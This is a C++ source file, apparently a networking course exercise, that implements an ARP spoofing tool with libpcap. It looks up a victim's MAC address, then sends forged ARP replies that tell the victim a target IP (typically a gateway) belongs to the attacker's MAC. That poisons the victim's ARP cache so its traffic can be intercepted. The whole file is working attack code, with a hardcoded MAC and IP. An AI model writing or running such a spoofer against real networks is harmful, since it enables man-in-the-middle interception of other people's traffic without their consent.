#include <cstdio>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <cstring>
#include <iomanip>
#include <iostream>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}


char* getMac(const char* iface){
	int fd;
    	struct ifreq ifr;
    	char *macAddress = (char *)malloc(18);

    	fd = socket(AF_INET, SOCK_DGRAM, 0);

    	ifr.ifr_addr.sa_family = AF_INET;
    	strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);

    	ioctl(fd, SIOCGIFHWADDR, &ifr);

    	close(fd);

    	unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
    
    	sprintf(macAddress, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    	return macAddress;
}

#define MAC_ADDR_LEN 6
Mac send_arp(pcap_t *handle, const char* attacker_ip, const char* sender_ip)
{
    EthArpPacket packet;
    struct pcap_pkthdr *header;
    const u_char *response;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac("08:00:27:53:0c:ba");  // Substitute with your MAC Address
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac("08:00:27:53:0c:ba");  // Substitute with your MAC Address
    packet.arp_.sip_ = htonl(Ip(attacker_ip));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (1) {
        int pcap_next_res = pcap_next_ex(handle, &header, &response);
        if (pcap_next_res == 1) {
            EthArpPacket *recv_packet = (EthArpPacket *)response;
            if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp && 
                ntohs(recv_packet->arp_.op_) == ArpHdr::Reply &&
                recv_packet->arp_.sip_ == packet.arp_.tip_ && 
                recv_packet->arp_.tip_ == packet.arp_.sip_) {
                    
                return recv_packet->arp_.smac_;
            }
        } else if (pcap_next_res == -1 || pcap_next_res == -2) {
            printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
            return Mac::nullMac();
        }
    }
}


void arp_attack(pcap_t *handle, Mac attacker_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
{
	

        EthArpPacket packet;

        packet.eth_.dmac_ = sender_mac;
        packet.eth_.smac_ = attacker_mac;
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = attacker_mac;
        packet.arp_.sip_ = htonl(Ip(target_ip));
        packet.arp_.tmac_ = sender_mac;
        packet.arp_.tip_ = htonl(Ip(sender_ip));

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }


}




int main(int argc, char* argv[]) {
	if (argc < 4 || argc %2 != 0) {
		fprintf(stderr, "Invalid number of arguments\n");
		usage();
		return -1;
	}
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
		}
	

	char * my_mac = getMac(argv[1]);
	printf("MY MAC %s", my_mac);
	
	
	int i=2;
	for(i=2; i<argc; i+=2){
    		Mac sender_mac = send_arp(handle, "192.168.0.106", argv[i]);
	
		arp_attack(handle, Mac(my_mac),sender_mac, argv[i], argv[i+1]); 

		}
	free(my_mac);
	pcap_close(handle);
}
